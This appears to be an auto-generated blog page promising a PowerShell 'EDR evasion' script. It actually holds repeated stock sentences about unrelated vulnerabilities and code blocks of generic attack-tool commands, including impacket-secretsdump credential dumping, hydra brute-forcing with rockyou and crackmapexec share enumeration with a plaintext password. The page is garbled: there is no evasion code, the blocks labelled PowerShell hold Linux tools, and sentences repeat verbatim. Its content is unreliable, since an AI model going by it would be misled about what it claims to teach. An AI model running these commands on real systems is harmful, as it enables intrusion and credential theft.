---
TitleSEO: "EDR Evasion Techniques in PowerShell | ZureFX"
TitlePost: "EDR Evasion Techniques — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for edr evasion techniques. Built for security research and automation."
Keywords: "script, bash, fuzzer, tool, powershell"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-629.html"
URL_IMAGES: ""
Date: "2024-07-09"
Tags: "Script, Bash, Fuzzer, Tool, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-629"
Permalink: "/scripting/script-edr-evasion-techniques-629.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `secretsdump`
- `secretsdump`
- `hashcat`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

```powershell
crackmapexec smb 10.96.249.130 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.203.196 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.27.65.15
```

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.65.37/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.190.110
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.21.82/FUZZ
```

### Advanced Options

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 23.20s
```
